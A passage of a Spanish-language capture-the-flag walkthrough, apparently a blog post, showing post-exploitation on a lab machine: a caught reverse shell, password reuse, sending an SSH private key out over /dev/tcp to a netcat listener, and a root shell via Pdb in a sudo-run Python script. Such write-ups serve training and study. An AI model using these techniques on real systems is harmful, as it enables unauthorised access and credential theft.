+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.15] 49810
+
+script /dev/null <span class="nt">-qc</span> bash
+jenkins@phisermansphriends:~<span class="nv">$ </span>^Z
+</code></pre></div></div>
+
+<p>Hacemos el tratamiento de la TTY y estamos dentro del sistema.</p>
+
+<p>Miramos que usuarios hay en el sistema y vemos que hay 2 usuarios más además de el usario root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
+root:x:0:0:root:/root:/bin/bash
+mur:x:1000:1000:Mur Rusko,,,:/home/mur:/bin/bash
+jenkins:x:106:115:Jenkins,,,:/var/lib/jenkins:/bin/bash
+sysadmin:x:1001:1001:sysadmin,,,:/home/sysadmin:/bin/bash
+</code></pre></div></div>
+
+<p>Vamos a probar a reusar la pass de <strong>mur.rusko</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@phisermansphriends:~<span class="nv">$ </span>su mur
+Contraseña: 
+mur@phisermansphriends:/var/lib/jenkins<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que ha funcionado, listamos el home del usuario y vemos un fichero <strong>.password</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:/var/lib/jenkins<span class="nv">$ </span><span class="nb">cd</span> ~
+mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 32
+drwx------ 3 mur  mur  4096 ago 30 04:54 <span class="nb">.</span>
+drwxr-xr-x 5 root root 4096 ago 30 03:50 ..
+lrwxrwxrwx 1 mur  mur     9 ago 30 03:40 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 mur  mur   220 ago 29 14:23 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 mur  mur  3526 ago 29 14:23 .bashrc
+drwxr-xr-x 3 mur  mur  4096 ago 30 03:55 .local
+<span class="nt">-r--------</span> 1 mur  mur    34 ago 30 04:54 .password
+<span class="nt">-rw-r--r--</span> 1 mur  mur   807 ago 29 14:23 .profile
+<span class="nt">-r--------</span> 1 mur  mur    33 ago 30 03:55 user.txt
+</code></pre></div></div>
+
+<p>Lo abrimos y vemos lo que parece una contraseña de un script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> .password 
+<span class="k">if </span>password <span class="o">!=</span> <span class="s1">'SuperSecretPass'</span>:
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Enumeramos si puede ejecutar algún comando como root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>mur on phisermansphriends:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User mur may run the following commands on phisermansphriends:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/util.py
+</code></pre></div></div>
+
+<p>Vemos que no podemos leer el script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
+total 4
+<span class="nt">-r--------</span> 1 root root 1751 ago 30 04:41 util.py
+</code></pre></div></div>
+
+<p>Probamos a ejecutarlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/util.py
+Escuchando en localhost:443
+Escuchando en localhost:443
+</code></pre></div></div>
+
+<p>Lo único que vemos es que esta a la escucha en localhost en el puerto 443.</p>
+
+<p>Intentamos conectarnos por SSH pero vemos que no podemos conectarnos usando la password;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mur@10.0.2.15 
+mur@10.0.2.15: Permission denied <span class="o">(</span>publickey<span class="o">)</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Generamos las claves publica/privada y la añadimos al fichero <strong>authorized_keys</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
+
+mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/id_rsa.pub <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
+mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">chmod </span>600 ~/.ssh/authorized_keys
+</code></pre></div></div>
+
+<p>Nos mandamos a nuestra máquina la clave privada, pero por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mandamos por el puerto 443</span>
+mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">cat</span> .ssh/id_rsa <span class="o">&gt;</span> /dev/tcp/10.0.2.5/443
+
+<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> id_mur
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.15] 43688
+</code></pre></div></div>
+
+<p>Le cambiamos los permisos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>400 id_mur
+</code></pre></div></div>
+
+<p>Y nos conectamos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_mur mur@10.0.2.15
+Linux phisermansphriends.thl 6.1.0-23-amd64 <span class="c">#1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64</span>
+.-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. .-. .-. <span class="nb">.</span>  <span class="nb">.</span> .-. <span class="nb">.</span> <span class="nb">.</span> .-. 
+|-<span class="s1">' |-|  |  `-. |-  |(  |\/| |-| |\| `-. 
+'</span>   <span class="s1">' ` `-'</span> <span class="sb">`</span>-<span class="s1">' `-'</span> <span class="s1">' '</span> <span class="s1">'  ` ` '</span> <span class="s1">' ` `-'</span>
+.-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. .-. <span class="nb">.</span> <span class="nb">.</span> .-. .-. 
+|-<span class="s1">' |-| |(   |  |-  |\| |  )`-. 
+'</span>   <span class="s1">' ` '</span> <span class="s1">' `-'</span> <span class="sb">`</span>-<span class="s1">' '</span> <span class="sb">`</span> <span class="sb">`</span>-<span class="s1">' `-'</span> 
+Last login: Thu Aug 29 15:11:20 2024
+mur@phisermansphriends:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ahora ya podemos conectarnos al socket:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span>telnet localhost 443
+Trying ::1...
+Connection failed: Conexión rehusada
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+Password: SuperSecretPass
+Hola admin!
+
+Que hacemos: 
+<span class="o">[</span>1] Ver procesos
+<span class="o">[</span>2] Ver espacio libre
+<span class="o">[</span>3] Ver sockets
+<span class="o">[</span>4] Salir
+h
+</code></pre></div></div>
+
+<p>Metemos la clave que habíamos encontrado y en provocamos un fallo introduciendo un carácter en vez de un dígito.  Como vemos en la otra terminal, donde ejecutamos el socket, que nos muestra un error. La librería Pdb tiene un modo interactivo que nos permite ejecutar código en python. Entramos con interactive y abrimos una shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mur@phisermansphriends:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/util.py
+Escuchando en localhost:443
+invalid literal <span class="k">for </span>int<span class="o">()</span> with base 10: b<span class="s1">'h'</span>
+<span class="o">&gt;</span> /opt/util.py<span class="o">(</span>29<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
+-&gt; option <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
+<span class="o">(</span>Pdb<span class="o">)</span> interact
+<span class="k">*</span>interactive<span class="k">*</span>
+<span class="o">&gt;&gt;&gt;</span> import pty
+<span class="o">&gt;&gt;&gt;</span> pty.spawn<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
+root@phisermansphriends:/home/mur#
+</code></pre></div></div>
+
+<p>Espero que os haya gustado.</p>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
